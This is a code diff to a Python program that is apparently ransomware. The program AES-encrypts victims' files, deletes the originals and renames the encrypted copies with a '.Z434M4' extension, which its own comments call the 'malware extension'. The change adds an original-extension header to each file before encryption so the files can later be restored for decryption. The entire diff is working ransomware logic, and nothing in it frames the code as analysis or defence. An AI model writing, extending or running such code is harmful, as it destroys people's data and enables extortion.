@@ -72,13 +72,17 @@ def encrypt_file(file_info, extensions_map, result_queue):
         file_path, file_name = os.path.split(found_file_str)
         file_base, file_ext = os.path.splitext(file_name)
         
-        # Encrypt the file
-        encrypted = AES_obj.encrypt(file_content)
+        # Add extension information to file content (for decryption)
+        header = f"ORIGINAL_EXT:{file_ext[1:] if file_ext.startswith('.') else file_ext};".encode('utf-8')
+        file_content_with_header = header + file_content
+        
+        # Encrypt the file with header
+        encrypted = AES_obj.encrypt(file_content_with_header)
         
         # Delete the original file instead of shredding
         os.remove(found_file_bytes)
         
-        # Create new filename with malware extension (replacing original extension)
+        # Create new filename with malware extension
         new_file_name = os.path.join(file_path, file_base + ".Z434M4")
         
         # Store the mapping between encrypted filename and original extension
@@ -94,7 +98,6 @@ def encrypt_file(file_info, extensions_map, result_queue):
         
     except Exception as e:
         print(f"Error processing {found_file}: {str(e)}")
-
 
 def start_encryption(files):
     # Shared resources
@@ -133,8 +136,12 @@ def start_encryption(files):
             file_path, file_name = os.path.split(found_file_str)
             file_base, file_ext = os.path.splitext(file_name)
             
-            # Encrypt the file
-            encrypted = AES_obj.encrypt(file_content)
+            # Add extension information to file content (for decryption)
+            header = f"ORIGINAL_EXT:{file_ext[1:] if file_ext.startswith('.') else file_ext};".encode('utf-8')
+            file_content_with_header = header + file_content
+            
+            # Encrypt the file with header
+            encrypted = AES_obj.encrypt(file_content_with_header)
             
             # Delete the original file instead of shredding for speed
             os.remove(found_file_bytes)
